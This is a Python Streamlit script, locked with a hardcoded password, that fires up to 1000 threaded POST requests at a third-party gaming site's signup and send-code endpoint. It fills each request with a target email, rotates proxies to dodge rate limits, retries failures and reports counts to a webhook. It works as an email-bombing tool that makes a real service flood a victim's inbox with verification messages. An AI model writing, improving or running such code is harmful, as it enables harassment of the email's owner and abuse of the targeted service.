import requests
from concurrent.futures import ThreadPoolExecutor
import streamlit as st
from datetime import datetime
from tenacity import retry, stop_after_attempt, wait_exponential

# Password Protection for the UI
def check_password():
    password = st.text_input("Enter Password", type="password")
    if password == "@EmailTool123":
        return True
    elif password:
        st.error("Incorrect Password")
    return False

# Retry Mechanism with Exponential Backoff
@retry(stop=stop_after_attempt(3), wait=wait_exponential(multiplier=1, min=1, max=5))
def send_request(url, data, proxy=None):
    try:
        response = requests.post(url, data=data, proxies={"http": proxy, "https": proxy} if proxy else None)
        return response.status_code == 200
    except Exception:
        return False

# Main function to send requests
def run_requests(num_requests, url, data, proxies, webhook_url):
    success_count = 0
    fail_count = 0

    with ThreadPoolExecutor(max_workers=len(proxies) or 1) as executor:
        futures = [executor.submit(send_request, url, data, proxies[i % len(proxies)] if proxies else None) for i in range(num_requests)]
        for future in futures:
            if future.result():
                success_count += 1
            else:
                fail_count += 1

    # Display final counts
    st.write(f"Total Successes: {success_count}")
    st.write(f"Total Failures: {fail_count}")

    # Trigger webhook
    if webhook_url:
        webhook_data = {
            'success_count': success_count,
            'fail_count': fail_count,
            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        requests.post(webhook_url, json=webhook_data)

# Streamlit UI
if check_password():
    st.title("Asynchronous Requests Tool with Proxy, Retry, and Webhook Support")

    # Input fields
    email = st.text_input("Enter your email", "")
    webhook_url = st.text_input("Webhook URL for notifications", "")
    proxy_list = st.text_area("Enter Proxies (one per line)", "").split("\n")
    num_requests = st.number_input("Number of requests", min_value=1, max_value=1000, value=100)

    # URL and data for the POST request
    url = 'https://70games.net/user-send_code-user_create.htm'
    data = {
        'username': 'hdjdjd',
        'password': email,
        'inviter': '',
        'email': email,
        'code': '',
    }

    # Start button logic
    if st.button("Start Requests"):
        if email:
            run_requests(num_requests, url, data, proxy_list, webhook_url)
            st.success("Requests completed!")
        else:
            st.error("Please enter a valid email.")
